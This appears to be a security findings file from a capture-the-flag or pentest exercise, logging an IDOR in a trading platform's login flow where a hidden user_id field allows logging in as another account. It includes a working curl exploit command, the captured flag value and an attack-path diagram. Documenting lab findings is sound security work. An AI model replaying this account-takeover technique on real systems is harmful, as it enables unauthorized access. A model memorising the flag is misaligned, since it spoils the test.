@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T01:06:06.713467+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a75b76d7-3d00-4191-8c26-a3be3ed41e9c",
+      "timestamp": "2026-04-13T01:06:06.713341+00:00",
+      "title": "IDOR in Login Flow - Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:56629/password/test",
+      "description": "The password verification endpoint /password/{username} uses the user_id submitted in the POST body (hidden form field) rather than looking up the user_id from the username in the URL. An attacker can submit any user_id with the known password 'test' to authenticate as that user. By fuzzing the user_id field with values near 10032, user_id=10001 was found to accept password='test' and belongs to the flag account.",
+      "evidence": "POST /password/test with user_id=10001&password=test \u2192 302 to /dashboard. Dashboard response: 'Welcome, Flag flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}'\n\nThe flag is: flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}",
+      "tool_used": "curl manual IDOR testing",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -c cookies.txt -X POST http://172.17.0.1:56629/password/test -d 'username=test&user_id=10001&password=test' && curl -b cookies.txt http://172.17.0.1:56629/dashboard",
+        "expected": "Dashboard shows: Welcome, Flag flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "9934d25f-5cda-4a29-8e23-a02c05f3be08",
+      "timestamp": "2026-04-13T01:06:23.592839+00:00",
+      "title": "Trading Platform Architecture",
+      "mermaid": "flowchart TD\n  Browser --> Login[\"/login\"]\n  Login -->|POST username| PasswordPage[\"/password/test\"]\n  PasswordPage -->|POST user_id+password| Dashboard[\"/dashboard\"]\n  Dashboard --> DB[(Database)]\n  PasswordPage --> IDOR[\"IDOR via hidden user_id field\"]\n  IDOR --> FlagUser[\"user_id=10001 flag account\"]"
+    }
+  ]
+}
